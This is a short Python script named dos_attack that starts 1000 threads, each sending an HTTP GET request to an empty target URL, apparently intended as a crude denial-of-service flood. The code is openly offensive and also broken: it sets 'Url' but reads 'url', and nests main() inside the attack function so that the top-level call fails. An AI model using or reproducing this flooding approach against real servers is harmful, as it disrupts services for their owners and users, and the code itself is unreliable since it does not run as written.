import requests
import threading

def dos_attack():
    Url = ""
    response = requests.get(url)
    print(f'Response status code:{response.status_code}')

    def main():
        num_treads = 1000
        threeds = []
        for _ in range(num_treads):
            thread = threading.Thread(target=dos_attack)
            thread.start()
            threeds.append(thread)

        for thread in threeds:
            thread.join()

if __name__ == '__main__':
    main()
